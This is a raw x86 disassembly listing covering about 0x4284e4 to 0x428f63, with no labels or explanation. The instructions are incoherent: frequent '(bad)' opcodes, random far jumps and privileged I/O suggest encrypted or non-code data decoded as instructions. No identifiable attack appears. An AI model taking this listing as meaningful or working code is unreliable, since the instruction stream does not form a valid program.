  4284e4:	and    edi,ecx
  4284e6:	int3   
  4284e7:	mov    ebp,0x88ef2d72
  4284ec:	rcr    DWORD PTR [ebx+0x8],cl
  4284ef:	inc    ebx
  4284f0:	dec    ebx
  4284f1:	std    
  4284f2:	sahf   
  4284f3:	mov    WORD PTR [edx+0x16a0f121],cs
  4284f9:	mov    ds:0xb6bfb1b5,eax
  4284fe:	ss pop ds
  428500:	xor    al,0xc1
  428502:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428503:	scas   eax,DWORD PTR es:[edi]
  428504:	ret    
  428505:	adc    DWORD PTR [edi+0x77],eax
  428508:	xor    al,0xf7
  42850a:	inc    edx
  42850b:	ror    ebx,0xb
  42850e:	icebp  
  42850f:	idiv   cl
  428511:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428512:	sub    al,0x81
  428514:	cli    
  428515:	ja     0x4284b4
  428517:	repnz add cl,BYTE PTR [ecx-0x4c]
  42851b:	(bad)  
  42851c:	daa    
  42851d:	iret   
  42851e:	aas    
  42851f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428520:	jbe    0x4285a0
  428522:	and    al,0x72
  428524:	xchg   esp,eax
  428525:	in     eax,dx
  428526:	xor    ecx,ebx
  428528:	clc    
  428529:	outs   dx,BYTE PTR ds:[esi]
  42852a:	cwde   
  42852b:	ffree  st(5)
  42852d:	test   BYTE PTR [ebx+eiz*2+0x24b96bd6],cl
  428534:	lds    eax,FWORD PTR [eax]
	...
  428596:	push   ecx
  428597:	div    BYTE PTR ds:0x5bffb73e
  42859d:	dec    ebp
  42859f:	sar    BYTE PTR [ecx-0x50],cl
  4285a2:	push   esp
  4285a3:	push   ecx
  4285a4:	sbb    DWORD PTR [esi+0x1aee3],0x7
  4285ab:	add    DWORD PTR [eax],eax
  4285ad:	add    dh,ah
  4285af:	jle    0x4285b3
  4285b1:	and    dl,BYTE PTR [edi+0x2f7ff9a3]
  4285b7:	dec    edx
  4285b8:	xchg   BYTE PTR [ecx],ah
  4285ba:	jno    0x42854c
  4285bc:	lds    eax,FWORD PTR [ebx+0x28]
  4285bf:	mov    ds:0xd0229bd0,eax
  4285c4:	repz imul ecx,DWORD PTR [edx+ebp*1],0xb1302634
  4285cc:	div    BYTE PTR [esi-0x47]
  4285cf:	fistp  DWORD PTR [edx+0x13]
  4285d2:	jnp    0x428556
  4285d4:	or     edx,ebp
  4285d6:	mov    edi,0x8e7e28a9
  4285db:	jmp    0xa2feed1
  4285e0:	xchg   edi,eax
  4285e1:	sbb    esi,ecx
  4285e3:	int    0xf7
  4285e5:	xor    ecx,DWORD PTR [esi-0x59]
  4285e8:	cld    
  4285e9:	out    dx,eax
  4285ea:	cmp    ebx,edi
  4285ec:	mov    ebx,0x6ae5b910
  4285f1:	(bad)  
  4285f2:	mov    esi,0x6fbcfb6
  4285f7:	test   eax,0xc1e0b5d3
  4285fc:	mov    bh,cl
  4285fe:	mov    DWORD PTR [ebp+eax*1+0x5721d8ff],ebx
  428605:	cmp    eax,0xd2d6327a
  42860a:	mov    bh,0x5b
  42860c:	in     al,0xf7
  42860e:	dec    edi
  42860f:	and    BYTE PTR [ecx+0x2b4f2973],dl
  428615:	repnz mov ah,0x15
  428618:	pop    ds
  428619:	xor    eax,0xf9dcafc1
  42861e:	call   0x6869d23c
  428623:	shl    DWORD PTR [eax+0x31c728dc],cl
  428629:	sahf   
  42862a:	push   ds
  42862b:	push   0x71
  42862d:	es jle 0x428662
  428630:	sub    esp,ebp
  428632:	popf   
  428633:	pushf  
  428634:	mov    WORD PTR [edx+0xf9705a5],?
  42863a:	jmp    0x4b62:0x56e9e91a
  428641:	(bad)
  428644:	ror    DWORD PTR [ebx+0x593b0244],1
  42864a:	sahf   
  42864b:	out    0x97,al
  42864d:	pop    ss
  42864e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42864f:	dec    eax
  428650:	xchg   esp,eax
  428651:	push   0x32
  428653:	std    
  428654:	addr16 xchg ebx,eax
  428656:	(bad)  
  428657:	pop    edi
  428658:	fild   QWORD PTR [edi]
  42865a:	ins    BYTE PTR es:[edi],dx
  42865b:	jbe    0x428689
  42865d:	push   esp
  42865e:	mov    eax,ds:0xb2fbd8c4
  428663:	repnz xchg ebx,eax
  428665:	adc    DWORD PTR [eax+edx*4-0x63],eax
  428669:	loope  0x428637
  42866b:	sti    
  42866c:	jg     0x4286b0
  42866e:	jge    0x42861b
  428670:	ja     0x428606
  428672:	xchg   BYTE PTR [ecx+0x77699d8e],bh
  428678:	std    
  428679:	and    eax,esp
  42867b:	add    DWORD PTR [edi-0x4a6bccf4],0x4e500380
  428685:	push   cs
  428686:	fist   DWORD PTR [eax-0x23]
  428689:	dec    ebp
  42868a:	jg     0x42866d
  42868c:	jp     0x428709
  42868e:	push   ebx
  42868f:	cld    
  428690:	pushf  
  428691:	(bad)  
  428692:	cli    
  428693:	pop    ebp
  428694:	add    BYTE PTR [edi],bl
  428696:	repnz adc ecx,DWORD PTR [esi+0x6c4d1d0f]
  42869d:	js     0x428675
  42869f:	pop    es
  4286a0:	lock imul edx,DWORD PTR [esi+0x6c],0x39890a8d
  4286a8:	xchg   esp,eax
  4286a9:	jo     0x4286cb
  4286ab:	jns    0x428727
  4286ad:	ror    DWORD PTR [edi+0xe660115],1
  4286b3:	(bad)  
  4286b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  428715:	add    BYTE PTR [esi+0x5b],dl
  428718:	xor    al,0x78
  42871a:	cmp    eax,0x967f5e7f
  42871f:	or     bh,BYTE PTR ss:[ecx-0x6627992]
  428726:	jmp    0x1:0x70001af
  42872d:	add    BYTE PTR [edi-0x12c26e70],ah
  428733:	(bad)  
  428734:	mov    edx,0xab65673b
  428739:	test   eax,0x509df803
  42873e:	stos   BYTE PTR es:[edi],al
  42873f:	or     BYTE PTR [edi],dh
  428741:	cld    
  428742:	sbb    eax,0xf50b3136
  428747:	xchg   ecx,ecx
  428749:	and    DWORD PTR [edi+0x76875ba2],edx
  42874f:	mov    ah,0x47
  428751:	mov    ah,0xde
  428753:	xchg   edx,eax
  428754:	xor    DWORD PTR [ebp-0x69],0xffffffb0
  428758:	fsub   DWORD PTR [bx+si+0x1ccc]
  42875d:	jno    0x428746
  42875f:	xchg   BYTE PTR [edi+0x6d],cl
  428762:	out    dx,al
  428763:	cmp    al,BYTE PTR [ebx-0x58501efa]
  428769:	jbe    0x428721
  42876b:	mov    cl,0x9e
  42876d:	outs   dx,DWORD PTR ds:[esi]
  42876e:	pushf  
  42876f:	imul   ecx,ecx,0x5c5130ed
  428775:	mov    ds:0x615bbc1d,eax
  42877a:	or     al,0x97
  42877c:	sub    BYTE PTR [eax+0x3dad7c24],0x8b
  428783:	adc    cl,cl
  428785:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428786:	cli    
  428787:	int3   
  428788:	push   eax
  428789:	add    al,0x6c
  42878b:	mov    ds:0x3c3ef346,al
  428790:	mov    eax,0xe33a9436
  428795:	ret    0xd868
  428798:	sahf   
  428799:	and    eax,0xe18e3365
  42879e:	out    dx,eax
  42879f:	mov    ds:0x66d27b15,eax
  4287a4:	out    0x76,al
  4287a6:	sub    eax,0xc34b61af
  4287ab:	scas   eax,DWORD PTR es:[edi]
  4287ac:	dec    edx
  4287ae:	rcr    ah,0x2d
  4287b1:	pusha  
  4287b2:	xchg   esp,esp
  4287b4:	mov    ebx,0xda5fe213
  4287b9:	push   eax
  4287ba:	fld    DWORD PTR [esi+0x3cd303cf]
  4287c0:	add    DWORD PTR [ebx+edx*4],edx
  4287c3:	(bad)  
  4287c4:	outs   dx,DWORD PTR ds:[esi]
  4287c5:	push   esi
  4287c6:	(bad)  
  4287c7:	and    ecx,DWORD PTR [ecx-0x40374001]
  4287cd:	scas   eax,DWORD PTR es:[edi]
  4287ce:	gs clc 
  4287d0:	mov    bl,0xa3
  4287d2:	mov    edi,0x630309da
  4287d7:	retf   0xea61
  4287da:	and    al,0xe0
  4287dc:	dec    edx
  4287dd:	jo     0x4287b4
  4287df:	stos   BYTE PTR es:[edi],al
  4287e0:	leave  
  4287e1:	push   esi
  4287e2:	mov    eax,ds:0x720ccc4b
  4287e7:	mov    ds:0xe2f0bfdf,eax
  4287ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4287ed:	shl    ebx,0x8a
  4287f0:	push   esi
  4287f1:	add    dh,0x77
  4287f4:	neg    BYTE PTR [edx+0x6a]
  4287f7:	cmp    BYTE PTR [ecx],0x1a
  4287fa:	xchg   ebx,eax
  4287fb:	cmp    eax,0xaf71d15f
  428800:	sub    cl,BYTE PTR [esi*1-0x29125feb]
  428807:	shr    BYTE PTR [edi+0x5ce95d],1
  42880d:	test   bh,ch
  42880f:	call   0xcaed129a
  428814:	mov    BYTE PTR [ebx],cl
  428816:	add    al,0x1b
  428818:	scas   eax,DWORD PTR es:[edi]
  428819:	mov    bh,0xdf
  42881b:	lahf   
  42881c:	push   eax
  42881d:	inc    eax
  42881e:	sub    ebp,DWORD PTR [esi-0x9]
  428821:	retf   0x9779
  428824:	ja     0x4287ce
  428826:	mov    eax,0x6fdc4f47
  42882b:	lea    ebp,[esi-0x146f0f9e]
  428831:	xchg   edi,eax
  428832:	pop    es
  428833:	lods   al,BYTE PTR ds:[esi]
  428834:	mov    edx,0x0
	...
  428895:	add    BYTE PTR [esi],ah
  428897:	jp     0x42890a
  428899:	les    edi,FWORD PTR [ebp-0x31]
  42889c:	mov    bh,0xfa
  42889e:	ret    
  42889f:	ja     0x428848
  4288a1:	test   DWORD PTR ds:0xf101ee17,ecx
  4288a7:	mov    al,0x1
  4288a9:	add    BYTE PTR [edi],al
  4288ab:	add    DWORD PTR [eax],eax
  4288ad:	add    BYTE PTR [edx+0x507469fe],ch
  4288b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4288b4:	mov    gs,ebx
  4288b6:	adc    cl,ah
  4288b8:	into   
  4288b9:	xor    DWORD PTR [esi-0x3c751a0f],esp
  4288bf:	mov    DWORD PTR [ebp+0x60],esp
  4288c2:	(bad)  
  4288c3:	in     al,0xab
  4288c5:	xchg   DWORD PTR [ecx-0x52a17c06],ecx
  4288cb:	lods   al,BYTE PTR ds:[esi]
  4288cc:	daa    
  4288cd:	pop    eax
  4288ce:	mov    ebx,0x758e4c41
  4288d3:	fmul   DWORD PTR [ecx-0x5]
  4288d6:	cld    
  4288d7:	pop    edx
  4288d8:	xchg   ebp,eax
  4288d9:	in     eax,0x63
  4288db:	jns    0x42890e
  4288dd:	and    DWORD PTR [edx+0x2c9fde66],esi
  4288e3:	or     ecx,DWORD PTR gs:[ecx]
  4288e6:	and    BYTE PTR [esi-0x52],0xe
  4288ea:	xor    BYTE PTR [eax-0x15e5b20c],al
  4288f0:	cmp    eax,0x74d8531d
  4288f5:	mov    eax,ds:0xc75cad05
  4288fa:	(bad)  
  4288fc:	jp     0x42892d
  4288fe:	jnp    0x4288e0
  428900:	dec    eax
  428901:	adc    eax,ebx
  428903:	mov    al,0xad
  428905:	(bad)  
  428906:	fimul  DWORD PTR ds:0x8198919d
  42890c:	daa    
  42890d:	jmp    0x4288e6
  42890f:	pusha  
  428910:	mov    edx,0xe4ce0ee9
  428915:	mov    edi,0x7542730e
  42891a:	dec    esp
  42891b:	into   
  42891c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42891d:	mov    ebx,0x54137dd2
  428922:	mov    ch,BYTE PTR [eax]
  428924:	jmp    0x217a:0x56bb5637
  42892b:	mov    ebp,0x77604f47
  428930:	adc    edi,esi
  428932:	add    ebp,edi
  428934:	mov    edx,eax
  428936:	fmulp  st(2),st
  428938:	xchg   esi,eax
  428939:	dec    esi
  42893a:	ins    DWORD PTR es:[edi],dx
  42893b:	ins    DWORD PTR es:[edi],dx
  42893c:	std    
  42893d:	inc    ecx
  42893e:	sti    
  42893f:	cmp    eax,0x3f134d91
  428944:	xor    eax,0x5f88a609
  428949:	aaa    
  42894a:	cmp    BYTE PTR [edx+0x8d2c762],bh
  428950:	mov    eax,ds:0x9dc6827f
  428955:	sbb    DWORD PTR [edi],0x22
  428958:	sahf   
  428959:	lahf   
  42895a:	test   al,ch
  42895c:	push   eax
  42895d:	sbb    BYTE PTR [edx+ebp*1+0x2b],cl
  428961:	lds    edi,FWORD PTR [ebx-0x42048a1]
  428967:	in     al,dx
  428968:	dec    ebp
  428969:	neg    cl
  42896b:	arpl   ax,di
  42896d:	in     eax,0x9c
  42896f:	ins    BYTE PTR es:[edi],dx
  428970:	call   0x2f3f664c
  428975:	and    eax,0x4a5bdeef
  42897a:	sbb    eax,0xafeaede6
  42897f:	mov    edx,0x2dcacb45
  428984:	scas   eax,DWORD PTR es:[edi]
  428985:	lds    ebp,FWORD PTR [edi]
  428987:	xchg   ebp,eax
  428988:	and    ebx,DWORD PTR [edx]
  42898a:	test   al,0x65
  42898c:	cld    
  42898d:	aam    0x37
  42898f:	mov    al,ds:0xd6a60ed1
  428994:	add    dl,dl
  428996:	bound  eax,QWORD PTR [eax+esi*8+0x5c3613a6]
  42899d:	adc    eax,0xda566eb3
  4289a2:	jmp    0x7d9b1d9f
  4289a7:	or     al,0x5b
  4289a9:	or     ch,BYTE PTR [edi]
  4289ab:	push   0xb3931d5
  4289b0:	jl     0x42897f
  4289b2:	cmp    al,0xb5
  4289b4:	aam    0x0
	...
  428a16:	dec    ebp
  428a17:	or     al,0xf8
  428a19:	pop    ebx
  428a1a:	stc    
  428a1b:	(bad)  
  428a1c:	out    dx,eax
  428a1d:	push   ds
  428a1e:	push   ss
  428a1f:	xchg   edx,eax
  428a20:	data16 aas 
  428a22:	outs   dx,BYTE PTR ds:[esi]
  428a23:	jmp    0x1:0xb1f89f0a
  428a2a:	pop    es
  428a2b:	add    DWORD PTR [eax],eax
  428a2d:	add    dh,dl
  428a2f:	das    
  428a30:	add    ch,BYTE PTR [ebp+0x6c]
  428a33:	inc    ebx
  428a34:	push   esp
  428a35:	repz popf 
  428a37:	cmp    DWORD PTR [ebx-0x7258429d],esp
  428a3d:	sub    ch,BYTE PTR [ebp+0x638013e3]
  428a43:	mov    cl,0x66
  428a45:	rcr    BYTE PTR [ecx+0x49],cl
  428a48:	xchg   esi,eax
  428a49:	mov    edx,0xe6b7ca14
  428a4e:	enter  0xbd63,0xc6
  428a52:	int    0xfe
  428a54:	lods   al,BYTE PTR ds:[esi]
  428a55:	pop    edx
  428a56:	jp     0x428a22
  428a58:	lea    edx,[edi]
  428a5a:	jle    0x4289e2
  428a5c:	cmc    
  428a5d:	cmp    bh,dh
  428a5f:	out    0xa4,al
  428a61:	mov    eax,ebp
  428a63:	mov    esi,0x9bb86520
  428a68:	mov    edx,DWORD PTR [bx-0xe]
  428a6c:	mov    bl,0xa6
  428a6e:	iret   
  428a6f:	dec    edx
  428a70:	and    bh,dh
  428a72:	sub    al,0x37
  428a74:	jbe    0x428acf
  428a76:	push   edi
  428a77:	jecxz  0x428a49
  428a79:	outs   dx,BYTE PTR ds:[esi]
  428a7a:	and    BYTE PTR [edx],ah
  428a7c:	or     bl,BYTE PTR [ecx-0x424d0ad1]
  428a82:	out    dx,al
  428a83:	aam    0x12
  428a85:	rcl    DWORD PTR [esi],1
  428a87:	or     dl,BYTE PTR [edi+0x7f2e9daa]
  428a8d:	es ins DWORD PTR es:[edi],dx
  428a8f:	add    bh,BYTE PTR [ebp+0x3]
  428a92:	pop    edi
  428a93:	mov    WORD PTR [eax-0x57],cs
  428a96:	dec    ecx
  428a97:	or     ch,dl
  428a99:	mov    ds,WORD PTR [esi+0x20e38c24]
  428a9f:	ror    BYTE PTR [ebx-0x68d4f24b],cl
  428aa5:	aad    0x84
  428aa7:	iret   
  428aa8:	pop    edx
  428aa9:	push   ebp
  428aaa:	test   DWORD PTR [edx],0x6480e278
  428ab0:	sbb    DWORD PTR fs:[edx-0x2629988d],eax
  428ab7:	inc    ecx
  428ab8:	push   ss
  428ab9:	jb     0x428aca
  428abb:	fnstcw WORD PTR [ebx-0x422778c0]
  428ac1:	aad    0x64
  428ac3:	push   edi
  428ac4:	mov    dl,0x15
  428ac6:	scas   al,BYTE PTR es:[edi]
  428ac7:	adc    edi,eax
  428ac9:	add    DWORD PTR [eax-0x401d4822],esp
  428acf:	jge    0x428ab4
  428ad1:	pop    ebx
  428ad2:	popa   
  428ad3:	mov    bh,0xac
  428ad5:	push   esp
  428ad6:	popa   
  428ad7:	cmp    DWORD PTR [edi],esp
  428ad9:	or     DWORD PTR [ecx-0x18a62097],ecx
  428adf:	push   ss
  428ae0:	int3   
  428ae1:	(bad)  
  428ae3:	and    ch,BYTE PTR [esi+ebx*8-0xaa407bf]
  428aea:	data16 ss jne 0x428a7c
  428aee:	pop    ebx
  428aef:	jge    0x428b4f
  428af1:	jge    0x428a8e
  428af3:	sbb    ch,BYTE PTR [ebx]
  428af5:	mov    gs,WORD PTR [ebp+0x69]
  428af8:	push   edx
  428af9:	mov    WORD PTR [eax+0x5f87fc8d],ss
  428aff:	shl    ah,cl
  428b01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428b02:	outs   dx,DWORD PTR ds:[esi]
  428b03:	and    DWORD PTR [edx-0x50698587],ebp
  428b09:	sbb    eax,0x165b9ff5
  428b0e:	jp     0x428b16
  428b10:	stos   BYTE PTR es:[edi],al
  428b11:	and    al,0xa1
  428b13:	sahf   
  428b14:	sahf   
  428b15:	sbb    esp,DWORD PTR [ebp+0x21]
  428b18:	push   0x36
  428b1a:	ja     0x428b77
  428b1c:	push   ds
  428b1d:	in     eax,0x6e
  428b1f:	pushf  
  428b20:	sahf   
  428b21:	jg     0x428aec
  428b23:	addr16 cmp al,0x2e
  428b26:	cmp    edi,DWORD PTR [eax-0x62e4857c]
  428b2c:	add    al,BYTE PTR [eax-0x13]
  428b2f:	pop    es
  428b30:	sub    dl,BYTE PTR [ebx+0x79]
  428b33:	scas   eax,DWORD PTR es:[edi]
  428b34:	js     0x428b36
	...
  428b96:	lds    edx,FWORD PTR [ebp-0x76]
  428b99:	cli    
  428b9a:	call   0x5fb1:0xb77ff5ff
  428ba1:	test   eax,0xea1402cf
  428ba6:	push   DWORD PTR [edx+0x1070001]
  428bac:	add    BYTE PTR [eax],al
  428bae:	inc    esp
  428baf:	test   BYTE PTR [esi+0x6d],dl
  428bb2:	or     eax,0xee66e760
  428bb7:	mov    ebp,0xb484b46c
  428bbc:	sub    bh,dl
  428bbe:	mov    ah,0xda
  428bc0:	(bad)  
  428bc1:	into   
  428bc2:	xor    edi,ebp
  428bc4:	mov    bh,0x97
  428bc6:	mov    ds:0xef512687,eax
  428bcb:	sahf   
  428bcc:	inc    ebp
  428bcd:	or     eax,0xeae441df
  428bd2:	cmp    edx,DWORD PTR [ebp+0x1f]
  428bd5:	imul   esi,edx,0xb2bc92f8
  428bdb:	dec    esi
  428bdc:	imul   eax,ecx,0x92d3610c
  428be2:	push   esi
  428be3:	pop    esi
  428be4:	xchg   ebx,eax
  428be5:	push   eax
  428be6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428be7:	dec    edx
  428be8:	pushf  
  428be9:	es mov edx,0x59e66277
  428bef:	int    0x10
  428bf1:	mov    ecx,0x79f8551a
  428bf6:	popf   
  428bf7:	inc    ecx
  428bf8:	mov    edx,0x4e169bb8
  428bfd:	(bad)  
  428bfe:	in     al,0x86
  428c00:	jecxz  0x428c0c
  428c02:	fdivrp st(0),st
  428c04:	outs   dx,BYTE PTR ds:[esi]
  428c05:	jbe    0x428c83
  428c07:	dec    ebp
  428c08:	mov    BYTE PTR [edx-0x42],ah
  428c0b:	rcr    DWORD PTR [esi],1
  428c0d:	jge    0x428c20
  428c0f:	(bad)  
  428c10:	daa    
  428c11:	addr16 in al,dx
  428c13:	cmp    BYTE PTR [edi-0x46ce1669],bh
  428c19:	fisubr DWORD PTR [ebp+0x204e13b7]
  428c1f:	retf   
  428c20:	mov    edx,0x62ce26e4
  428c25:	and    ah,bl
  428c27:	shr    esp,0x87
  428c2a:	daa    
  428c2b:	sbb    ah,al
  428c2d:	sub    al,0xb0
  428c2f:	mov    edi,0x7e4c45ca
  428c34:	push   cs
  428c35:	fcom   QWORD PTR [ebx]
  428c37:	and    DWORD PTR [esi-0x5a],ecx
  428c3a:	clc    
  428c3b:	xor    eax,0xade21f78
  428c40:	scas   al,BYTE PTR es:[edi]
  428c41:	(bad)  
  428c43:	(bad)  
  428c44:	xchg   ebp,eax
  428c45:	int3   
  428c46:	add    BYTE PTR [esi+0x661f317],cl
  428c4c:	outs   dx,BYTE PTR ds:[esi]
  428c4d:	mov    ah,0xa3
  428c4f:	(bad)  
  428c50:	sbb    dh,dh
  428c52:	xchg   edx,ebp
  428c54:	add    eax,0x2090dc5f
  428c59:	sbb    esp,ebx
  428c5b:	and    BYTE PTR [edi-0x4c33ea84],0xc2
  428c62:	ja     0x428c04
  428c64:	stos   DWORD PTR es:[edi],eax
  428c65:	adc    ah,al
  428c67:	jbe    0x428cba
  428c69:	cmp    ch,BYTE PTR [ebx]
  428c6b:	dec    esp
  428c6c:	xchg   esi,eax
  428c6d:	aam    0xf1
  428c6f:	shl    BYTE PTR [eax-0x5dd13a40],cl
  428c75:	jp     0x428c7f
  428c77:	jge    0x428c3d
  428c79:	in     al,0xa4
  428c7b:	fmulp  st(7),st
  428c7d:	pop    ds
  428c7e:	cmp    eax,0xcfabd958
  428c83:	les    esi,FWORD PTR ds:0xe1739c32
  428c89:	adc    ecx,ebp
  428c8b:	imul   esp,DWORD PTR [ebx+0x675bdc8],0x980b549d
  428c95:	test   al,0x75
  428c97:	pop    esp
  428c98:	dec    esi
  428c99:	jns    0x428c4a
  428c9b:	mov    al,ds:0xe84f0448
  428ca0:	and    DWORD PTR [ecx-0x82bbf45],edi
  428ca6:	mov    eax,ds:0x5ae97886
  428cab:	shl    DWORD PTR [ebp+edi*8+0x1f],1
  428caf:	dec    edi
  428cb0:	pushf  
  428cb1:	inc    edi
  428cb2:	xor    BYTE PTR [edx+0xca],dl
	...
  428d14:	add    BYTE PTR [eax],al
  428d16:	xor    DWORD PTR [ebp+0x75f531f1],0x9686b5c1
  428d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d21:	jns    0x428d31
  428d23:	jle    0x428d5b
  428d25:	daa    
  428d26:	push   es
  428d27:	mov    ah,0x1
  428d29:	add    BYTE PTR [edi],al
  428d2b:	add    DWORD PTR [eax],eax
  428d2d:	add    BYTE PTR [esi+0x423812f9],dl
  428d33:	lahf   
  428d34:	pop    edx
  428d35:	pop    ss
  428d36:	je     0x428cea
  428d38:	adc    DWORD PTR [edx+0x20654367],ebx
  428d3e:	popf   
  428d3f:	add    eax,0xebfa2b53
  428d44:	jecxz  0x428d70
  428d46:	mov    esp,0x3e445723
  428d4b:	mov    ebp,0x53cfb2f
  428d50:	mov    WORD PTR [eax-0x51201e23],gs
  428d56:	dec    esi
  428d57:	les    edx,FWORD PTR [edx]
  428d59:	rcr    DWORD PTR [ebx+0x663c3de0],cl
  428d5f:	mov    ecx,0xaf7db85
  428d64:	lock sub al,BYTE PTR [esi+0x1b]
  428d68:	ins    BYTE PTR es:[edi],dx
  428d69:	rol    BYTE PTR [eax+0x30],1
  428d6c:	cmp    BYTE PTR ds:0x8c9118d3,dh
  428d72:	js     0x428dbc
  428d74:	push   edx
  428d75:	inc    eax
  428d76:	ret    
  428d77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428d78:	in     eax,dx
  428d79:	dec    di
  428d7b:	fisub  DWORD PTR [ebp-0x5f]
  428d7e:	cdq    
  428d7f:	inc    ebp
  428d80:	jno    0x428dd2
  428d82:	pop    eax
  428d83:	std    
  428d84:	dec    ecx
  428d85:	jnp    0x428d6d
  428d87:	jmp    0x85f7:0x1b2b922c
  428d8e:	jle    0x428df9
  428d90:	mov    esi,0xea11e0ae
  428d95:	test   BYTE PTR [esi+0x1d],al
  428d98:	add    DWORD PTR [edi-0x5b1c6f71],ebx
  428d9e:	inc    edx
  428d9f:	ret    
  428da0:	fsubr  st,st(0)
  428da2:	sub    ebx,0xffffffbd
  428da5:	inc    eax
  428da6:	outs   dx,DWORD PTR ds:[esi]
  428da7:	js     0x428d9e
  428da9:	retf   
  428daa:	add    ch,BYTE PTR [ebp-0x58]
  428dad:	es daa 
  428daf:	aas    
  428db0:	(bad)  
  428db1:	xchg   ebx,eax
  428db2:	mov    ds:0x9dbf6c1d,al
  428db7:	pusha  
  428db8:	jne    0x428d78
  428dba:	jae    0x428de2
  428dbc:	xor    cl,BYTE PTR [eax]
  428dbe:	sbb    al,0x90
  428dc0:	xchg   esp,eax
  428dc1:	scas   al,BYTE PTR es:[edi]
  428dc2:	dec    edx
  428dc3:	push   edi
  428dc4:	pop    es
  428dc5:	jb     0x428da6
  428dc7:	out    dx,al
  428dc8:	cmp    bl,bh
  428dca:	add    esp,ebx
  428dcc:	mov    bh,ah
  428dce:	(bad)
  428dd3:	out    dx,eax
  428dd4:	mov    dl,0xe2
  428dd6:	cmc    
  428dd7:	adc    DWORD PTR ds:0x852653f3,edx
  428ddd:	int    0x4b
  428ddf:	lds    ebx,FWORD PTR [ecx]
  428de1:	mov    eax,ds:0xc88660af
  428de6:	or     al,0x1
  428de8:	(bad)  
  428de9:	je     0x428d9f
  428deb:	(bad)
  428def:	lods   al,BYTE PTR ds:[esi]
  428df0:	mov    ch,0x8e
  428df2:	pusha  
  428df3:	test   al,0x98
  428df5:	test   eax,0x762d78a
  428dfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428dfb:	inc    edx
  428dfc:	mov    esp,0xaaaedacc
  428e01:	inc    ebp
  428e02:	das    
  428e03:	outs   dx,BYTE PTR ds:[esi]
  428e04:	push   ebp
  428e05:	or     cl,BYTE PTR [edi-0x61ddff75]
  428e0b:	mov    edx,0x8db56117
  428e10:	cmp    edx,DWORD PTR [esi]
  428e12:	mov    al,0x1e
  428e14:	arpl   WORD PTR [edi+0x66],sp
  428e17:	pop    esp
  428e18:	xchg   DWORD PTR [ebx+0x48],ebx
  428e1b:	int3   
  428e1c:	add    ebp,eax
  428e1e:	sar    DWORD PTR [eax],1
  428e20:	ret    
  428e21:	jne    0x428e59
  428e23:	ja     0x428dbd
  428e25:	sub    eax,0xec367eb
  428e2a:	out    0xb7,eax
  428e2c:	cmc    
  428e2d:	or     edi,DWORD PTR [eax]
  428e2f:	xor    ecx,ecx
  428e31:	ds sti 
  428e33:	popa   
  428e34:	inc    BYTE PTR [eax]
	...
  428e96:	dec    edi
  428e97:	pop    ebp
  428e98:	pop    ecx
  428e99:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428e9d:	(bad)  
  428e9f:	cli    
  428ea0:	test   al,0xd9
  428ea2:	test   DWORD PTR [eax-0x4af27483],edx
  428ea8:	add    DWORD PTR [eax],eax
  428eaa:	pop    es
  428eab:	add    DWORD PTR [eax],eax
  428ead:	add    BYTE PTR [eax+0x768444a0],ah
  428eb3:	or     BYTE PTR [esp+0x30c4e5e9],0x9a
  428ebb:	xlat   BYTE PTR ds:[ebx]
  428ebc:	cmp    ecx,ecx
  428ebe:	retf   
  428ebf:	popf   
  428ec0:	or     WORD PTR ds:0xeadce225,sp
  428ec7:	lods   eax,DWORD PTR ds:[esi]
  428ec8:	pop    edi
  428ec9:	add    BYTE PTR [ecx-0x7],ah
  428ecc:	div    ch
  428ece:	or     dl,BYTE PTR [edx]
  428ed0:	jp     0x428f46
  428ed2:	cli    
  428ed3:	(bad)  
  428ed4:	push   ebx
  428ed5:	mov    cl,0xd6
  428ed7:	dec    eax
  428ed8:	pop    eax
  428ed9:	mov    ds:0x6f025b78,eax
  428ede:	ins    DWORD PTR es:[edi],dx
  428edf:	rcr    BYTE PTR [eax+0x70],1
  428ee2:	jle    0x428f04
  428ee4:	cwde   
  428ee5:	aam    0x3e
  428ee7:	jne    0x428f4a
  428ee9:	mov    eax,ds:0xc638d354
  428eee:	sub    DWORD PTR [eax],esp
  428ef0:	sbb    eax,0x900ac18c
  428ef5:	pop    edx
  428ef6:	ja     0x428ead
  428ef8:	mov    esi,0x3b55c06e
  428efd:	enter  0xf7cc,0x62
  428f01:	or     edi,DWORD PTR [edx-0x22eccd5b]
  428f07:	push   esp
  428f08:	jae    0x428f7e
  428f0a:	cmp    esp,DWORD PTR [edi+ebx*4]
  428f0d:	mov    eax,ds:0x3ff470f8
  428f12:	rol    BYTE PTR [esi-0x2be9803a],0xce
  428f19:	imul   ebp,DWORD PTR [edi-0x1f31be48],0x0
  428f20:	ja     0x428ed0
  428f22:	or     DWORD PTR [ebx-0x68e6f4c7],ecx
  428f28:	inc    eax
  428f29:	retf   0x3587
  428f2c:	add    ebx,0xffffff9d
  428f2f:	and    ebp,DWORD PTR [ebp+0x65]
  428f32:	adc    ah,BYTE PTR [eax]
  428f34:	xlat   BYTE PTR ds:[ebx]
  428f35:	fwait
  428f36:	push   esi
  428f37:	adc    BYTE PTR [ebp-0x1b888a06],al
  428f3d:	ja     0x428ee1
  428f3f:	pop    edi
  428f40:	and    cl,BYTE PTR [edi+0x7c5bcf77]
  428f46:	(bad)  
  428f48:	scas   eax,DWORD PTR es:[edi]
  428f49:	add    esi,eax
  428f4b:	fcomp  DWORD PTR [edx+0x53]
  428f4e:	sub    dh,BYTE PTR es:[ebx+0x37]
  428f52:	xor    BYTE PTR [ebp+0x36dea15b],dl
  428f58:	xor    al,0x8c
  428f5a:	mov    ch,0x59
  428f5c:	ret    
  428f5d:	popf   
  428f5e:	(bad)  
  428f5f:	or     ecx,DWORD PTR [esi+0x7b]
  428f62:	daa    
  428f63:	inc    esp
